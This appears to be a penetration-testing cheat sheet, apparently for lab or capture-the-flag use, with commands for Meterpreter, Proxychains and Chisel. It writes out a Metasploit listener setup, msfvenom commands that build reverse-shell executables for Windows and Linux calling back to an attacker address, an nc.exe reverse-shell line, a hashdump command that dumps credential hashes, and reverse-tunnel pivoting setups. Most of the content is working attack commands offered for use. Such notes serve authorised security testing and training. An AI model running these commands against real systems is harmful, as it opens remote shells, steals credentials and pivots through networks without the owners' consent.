# Tools

## Meterpreter

Meterpreter is an advanced, dynamically extensible payload that uses in-memory DLL injection stagers and is extended over the network at runtime. It communicates over the stager socket and provides a comprehensive client-side Ruby API. It features command history, tab completion, channels, and more.  
_src : https://www.offsec.com/metasploit-unleashed/about-meterpreter/_

### Meterpreter setup listener

```bash
msfconsole
[...]
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.8
set LPORT 12345
set ExitOnSession false
exploit -j
```

### Meterpreter generate payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=12345 -f exe > shell.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=12345 -f elf > shell
```

### Useful commands

```bash
# Download file
download <file>
# Execute a command in background
execute -H -k -f cmd -a "/c nc.exe 10.10.14.10 1337 -e cmd.exe"
# Upload file (from the local machine)
upload <file>
# Edit file
edit <file>
# spawn a shell
shell
# Hashdump
hashdump
# List processes
ps
```

## Proxychains

### Proxychains setup

```bash
proxychains -q <command> # -q for quiet mode
```

### Proxychains setup config

```bash
vim /etc/proxychains.conf

[...]
[ProxyList]
socks5 127.0.0.1 60000 # Each line is a hop
socks5 127.0.0.1 60001
```

## Chisel

Chisel is a fast TCP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. It is a useful tool in combination with proxychains.

### Chisel setup

```bash
# On the local machine
chisel server -p 10000 --reverse --socks5
# On the remote machine
chisel client X.X.X.X:10000 R:60000:socks
# Opens a socks proxy on the local machine on port 60000
```
